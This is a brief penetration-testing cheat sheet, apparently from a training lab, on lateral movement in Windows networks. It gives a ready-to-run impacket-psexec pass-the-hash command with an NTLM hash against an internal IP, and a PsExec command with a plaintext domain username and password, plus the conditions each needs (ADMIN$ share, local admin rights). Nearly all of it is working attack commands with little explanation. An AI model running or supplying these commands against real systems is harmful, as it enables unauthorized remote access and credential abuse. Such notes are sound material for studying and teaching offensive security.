#impacket #lateral #exploit #pth


#### NTLM PTH(Pass the Hash)

🔴 Can't use any hashes from Local Admin group other than Administrator

```bash
impacket-psexec -hashes 00000000000000000000000000000000:e78ca771aeb91ea70a6f1bb372c186b6 Administrator@192.168.50.212
```

#### Windows PSEXEC

- Writes **psexesvc.exe** into the **C:\Windows** directory
- Creates and spawns a service on the remote host
- Runs the requested program/command as a child process of **psexesvc.exe**
- ADMIN$ share must be available and File and Printer Sharing has to be turned on
- User that authenticates to the target machine needs to be part of the Administrators local group in the target.

```cmd
./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
```
